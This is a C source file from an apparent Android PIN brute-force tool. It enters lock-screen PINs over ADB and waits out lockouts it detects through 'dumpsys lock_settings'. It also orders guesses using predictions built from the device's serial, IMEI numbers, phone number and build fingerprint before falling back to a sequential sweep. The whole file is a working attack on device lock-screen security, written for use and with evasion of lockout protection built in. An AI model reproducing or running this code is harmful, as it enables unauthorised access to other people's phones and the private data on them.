#define _GNU_SOURCE
#include "brute_adv.h"
#include "brute.h"
#include "predictor.h"
#include "pin_ml.h"
#include "pin_ai.h"
#include "adb.h"
#include "util.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>

static int keep = 1;

static void handler(int s) { (void)s; keep = 0; }

int brute_adv(int digits, int delay_ms, long start, long end, int resume, int skip_confirm) {
    long total = 1;
    for (int i = 0; i < digits; i++) total *= 10;
    long s = (start >= 0 && start < total) ? start : 0;
    long e = (end > 0 && end <= total) ? end : total;
    if (resume) { long t; long r = load_state(&t); if (r >= s && r < e) s = r; }

    printf("\n[*] ADV Brute: %ld-digit | %ld-%ld = %ld PINs | %dms\n",
           (long)digits, s, e-1, e-s, delay_ms);
    if (!skip_confirm && !yes_no("[*] Launch? [y/n]: ")) return 0;

    signal(SIGINT, handler);
    double t0 = (double)clock() / CLOCKS_PER_SEC;
    int lockout_count = 0;

    for (long i = s; i < e && keep; i++) {
        char pin[16]; snprintf(pin, sizeof(pin), "%0*ld", digits, i);

        int st = adb_state();
        if (st < 2) {
            printf(YELLOW "\n[!] ADB lost. Reconnecting...\n" RESET);
            adb_init();
            int w = 0;
            while (w < 15 && adb_state() < 2) { sleep(2); w += 2; }
            if (adb_state() < 2) break;
        }

        if ((i - s) % 10 == 0 && i > s) {
            char *lock = adb_shell("adb shell dumpsys lock_settings 2>/dev/null | grep -iE 'lockout|failed|attempt'");
            if (strstr(lock, "lockout")) {
                lockout_count++;
                int wait = (lockout_count > 5) ? 60 : 30;
                printf(YELLOW "\n[!] Lockout #%d. Waiting %ds...\n" RESET, lockout_count, wait);
                for (int j = 0; j < wait && keep; j++) { printf("."); fflush(stdout); sleep(1); }
                printf("\n");
                continue;
            }
        }

        if (adb_enter_pin_sakti(pin)) {
            if (adb_is_unlocked()) {
                printf(GREEN "\n[!!!] PIN FOUND: %s\n" RESET, pin);
                return 1;
            }
        }

        if (delay_ms > 0) usleep(delay_ms * 1000);

        double elapsed = ((double)clock() / CLOCKS_PER_SEC) - t0;
        long done = i - s;
        printf("\r[ADV] %0*ld | %.1f%% | %.1f/s | ETA %.0fs     ",
               digits, i, 100.0*(done)/(e-s), (done>0?done/elapsed:0),
               (done>0?(e-s)*elapsed/done:0)-elapsed);
        fflush(stdout);
        if ((i - s) % 100 == 0) save_state(i, total);
    }
    printf("\n");
    return 0;
}

int brute_adv_phase(const DeviceInfo *info, int digits, int delay_ms) {
    printf("\n" BOLD "=== Advanced Smart Brute ===" RESET "\n");
    printf("[*] Phase 0: AI Markov-chain predictions\n");
    printf("[*] Phase 1: ML-scored PINs\n");
    printf("[*] Phase 2: Device-specific PINs\n");
    printf("[*] Phase 3: Sequential brute\n");

    signal(SIGINT, handler);

    char pins[512][16];
    int npins = 0;

    /* Phase 0: AI Markov / Bayesian prediction */
    if (keep) {
        pin_ai_init(info->serial, info->imei1, info->imei2,
                    info->phone_number, info->build_fingerprint,
                    info->model, 0, 0);
        pin_ai_set_length(digits);
        long ai_total = pin_ai_count();
        int ai_used = 0;
        printf("[*] AI Phase: %ld predictions\n", ai_total);
        char ai_pin[16];
        while (pin_ai_next(ai_pin, 15) && ai_used < 256 && keep) {
            if (adb_enter_pin_sakti(ai_pin) && adb_is_unlocked()) {
                printf(GREEN "\n[!!!] PIN FOUND: %s\n" RESET, ai_pin);
                return 1;
            }
            if (delay_ms > 0) usleep(delay_ms * 1000);
            printf("\r[AI] %d/%ld %s  ", ai_used+1, ai_total, ai_pin);
            fflush(stdout);
            ai_used++;
        }
        printf("\n");
    }

    /* Phase 1: ML prediction (top 256 scored PINs) */
    if (keep) {
        npins = ml_predict_bootloop_pins(digits, pins, 256);
        printf("[*] ML Phase: %d smart PINs generated\n", npins);
        for (int i = 0; i < npins && keep; i++) {
            if (adb_enter_pin_sakti(pins[i]) && adb_is_unlocked()) {
                printf(GREEN "\n[!!!] PIN FOUND: %s\n" RESET, pins[i]);
                return 1;
            }
            if (delay_ms > 0) usleep(delay_ms * 1000);
            printf("\r[ML] %d/%d %s  ", i+1, npins, pins[i]);
            fflush(stdout);
        }
        printf("\n");
    }

    /* Phase 2: Device-specific PINs from predictor */
    if (keep) {
        char dev_pins[256][16];
        int ndev = predictor_generate(info, digits, dev_pins, 256);
        printf("[*] Device Phase: %d PINs from device data\n", ndev);
        for (int i = 0; i < ndev && keep; i++) {
            if (adb_enter_pin_sakti(dev_pins[i]) && adb_is_unlocked()) {
                printf(GREEN "\n[!!!] PIN FOUND: %s\n" RESET, dev_pins[i]);
                return 1;
            }
            if (delay_ms > 0) usleep(delay_ms * 1000);
            printf("\r[DEV] %d/%d %s  ", i+1, ndev, dev_pins[i]);
            fflush(stdout);
        }
        printf("\n");
    }

    /* Phase 3: Sequential brute */
    if (!keep) return 0;
    printf("\n[*] Phase 3: Sequential %d-digit\n", digits);
    return brute_adv(digits, delay_ms, 0, 0, 0, 1);
}
